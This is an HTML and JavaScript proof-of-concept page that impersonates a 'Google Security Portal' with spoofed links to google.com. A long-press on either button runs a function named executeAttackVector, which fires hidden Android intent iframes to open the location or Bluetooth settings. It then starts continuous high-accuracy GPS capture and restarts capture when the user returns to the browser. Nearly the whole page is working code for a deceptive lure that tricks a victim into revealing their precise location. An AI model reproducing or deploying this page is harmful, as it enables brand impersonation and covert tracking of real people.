<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto-Capture High-Accuracy Geolocation PoC</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f8f9fa;
            color: #202124;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .banner {
            font-size: 13px;
            color: #5f6368;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }
        h1 {
            font-size: 20px;
            color: #1a73e8;
            margin-bottom: 24px;
        }
        .button-container {
            display: flex;
            flex-direction: column;
            gap: 14px;
            width: 100%;
            max-width: 340px;
        }
        a.spoof-link {
            display: inline-block;
            background-color: #1a73e8;
            color: white;
            padding: 14px 28px;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
            transition: background-color 0.2s;
            box-sizing: border-box;
            width: 100%;
        }
        a.spoof-link:active {
            background-color: #1557b0;
        }
        .info-box {
            margin-top: 25px;
            max-width: 320px;
            width: 100%;
            background: #ffffff;
            border: 1px solid #dadce0;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
            font-size: 13px;
            color: #5f6368;
            word-break: break-all;
            display: none;
            text-align: left;
        }
        .footer-note {
            margin-top: 30px;
            font-size: 11px;
            color: #9aa0a6;
        }
        .pulse {
            color: #34a853;
            font-weight: bold;
            animation: blink 1.5s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.4; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>

    <div class="banner">Google Security Portal</div>
    <h1>High-Accuracy Location Auto-Capture</h1>

    <!-- Container 2 Tombol -->
    <div class="button-container">
        <!-- Button 1: Location Settings & GPS Auto-Capture -->
        <a href="https://google.com" class="spoof-link" id="targetLink1" data-intent="location">Long Press -> Trigger Location Settings & Capture</a>

        <!-- Button 2: Alternative Intent (Contoh: Bluetooth/Wireless Settings) dengan Logika yang Sama -->
        <a href="https://google.com" class="spoof-link" style="background-color: #34a853;" id="targetLink2" data-intent="bluetooth">Long Press -> Trigger Bluetooth Settings & Sync</a>
    </div>

    <!-- Info Box untuk menampilkan hasil koordinat lokasi secara real-time -->
    <div class="info-box" id="infoBox">
        <strong>Status:</strong> <span id="statusText" class="pulse">Waiting for activation...</span><br>
        <div id="coordDetails" style="margin-top: 8px;"></div>
    </div>

    <div class="footer-note">Cloud-secured verification system.</div>

    <script>
        let triggered = false;
        let watchId = null;

        const updatePositionData = (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            const altitude = position.coords.altitude || "N/A";
            const speed = position.coords.speed || "N/A";

            const statusText = document.getElementById("statusText");
            const coordDetails = document.getElementById("coordDetails");

            statusText.className = "";
            statusText.innerText = "Precise Location Captured Live!";
            coordDetails.innerHTML = `
                <b>Latitude:</b> ${lat}<br>
                <b>Longitude:</b> ${lon}<br>
                <b>Accuracy:</b> ±${accuracy} meters<br>
                <b>Altitude:</b> ${altitude}<br>
                <b>Speed:</b> ${speed}<br><br>
                <a href="https://maps.google.com/?q=${lat},${lon}" target="_blank" style="color: #1a73e8; text-decoration: underline;">Open in Google Maps</a>
            `;
        };

        const startLocationWatch = () => {
            if ("geolocation" in navigator) {
                watchId = navigator.geolocation.watchPosition(
                    updatePositionData,
                    (error) => {
                        const statusText = document.getElementById("statusText");
                        statusText.className = "";
                        statusText.innerText = `GPS Error / Disabled: ${error.message}. Please enable location settings.`;
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 30000,
                        maximumAge: 0
                    }
                );
            } else {
                document.getElementById("statusText").innerText = "Geolocation not supported.";
            }
        };

        const executeAttackVector = (intentType) => {
            if (triggered) return;
            triggered = true;

            const infoBox = document.getElementById("infoBox");
            const statusText = document.getElementById("statusText");
            
            infoBox.style.display = "block";
            statusText.className = "pulse";
            statusText.innerText = `Opening Android ${intentType === 'location' ? 'Location' : 'Bluetooth'} Settings & syncing GPS...`;

            setTimeout(() => {
                try {
                    // Memilih Intent berdasarkan tombol yang ditekan
                    const intentAction = intentType === 'location' 
                        ? "android.settings.LOCATION_SOURCE_SETTINGS" 
                        : "android.settings.BLUETOOTH_SETTINGS";

                    const intentFrame = document.createElement('iframe');
                    intentFrame.style.display = 'none';
                    intentFrame.src = `intent:#Intent;action=${intentAction};end;`;
                    document.body.appendChild(intentFrame);
                    setTimeout(() => document.body.removeChild(intentFrame), 1000);

                    // Memulai pelacakan koordinat GPS kontinyu
                    startLocationWatch();

                } catch (err) {
                    console.debug("Vector execution error:", err.message);
                } finally {
                    setTimeout(() => { triggered = false; }, 1500);
                }
            }, 2500);
        };

        // Event Listener untuk Tombol 1 (Location)
        const targetElement1 = document.getElementById("targetLink1");
        targetElement1.addEventListener("contextmenu", (e) => {
            executeAttackVector('location');
        });
        targetElement1.addEventListener("touchstart", () => {}, { passive: true });

        // Event Listener untuk Tombol 2 (Intent Lain / Bluetooth) dengan Logika Sama
        const targetElement2 = document.getElementById("targetLink2");
        targetElement2.addEventListener("contextmenu", (e) => {
            executeAttackVector('bluetooth');
        });
        targetElement2.addEventListener("touchstart", () => {}, { passive: true });

        // Auto-Trigger Handler saat kembali dari menu Setting Android ke browser (window focus)
        window.addEventListener("focus", () => {
            if (infoBox.style.display === "block") {
                startLocationWatch();
            }
        });
    </script>

</body>
</html>
